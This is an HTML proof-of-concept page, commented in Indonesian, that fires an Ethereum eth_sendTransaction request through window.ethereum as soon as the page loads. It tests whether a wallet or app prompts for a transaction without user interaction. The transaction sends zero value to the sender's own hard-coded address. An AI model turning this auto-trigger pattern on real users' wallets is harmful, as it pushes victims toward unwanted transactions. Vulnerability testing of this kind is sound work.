<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC: Unauthenticated Transaction Trigger</title>
</head>
<body>
    <h2>Security Proof of Concept</h2>
    <p>Memicu antarmuka transaksi secara otomatis...</p>

    <script>
        // Akses ke bridge dompet yang terekspos secara global
        const bridge = window.ethereum;

        async function triggerRealTx() {
            // Alamat dompet Anda
            const MY_WALLET_ADDRESS = "0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE"; 
            
            // Parameter transaksi nyata
            const txParams = {
                from: MY_WALLET_ADDRESS,
                to: MY_WALLET_ADDRESS, 
                value: '0x00', 
                data: '0x' 
            };

            try {
                // Memanggil method untuk memicu prompt transaksi
                // Jika aplikasi rentan, pop-up konfirmasi akan muncul tanpa interaksi
                await bridge.request({
                    method: 'eth_sendTransaction',
                    params: [txParams]
                });
            } catch (e) {
                console.error("Transkasi dipicu namun ditolak oleh pengguna atau sistem:", e);
            }
        }

        // Eksekusi otomatis saat halaman selesai dimuat
        window.onload = triggerRealTx;
    </script>
</body>
</html>
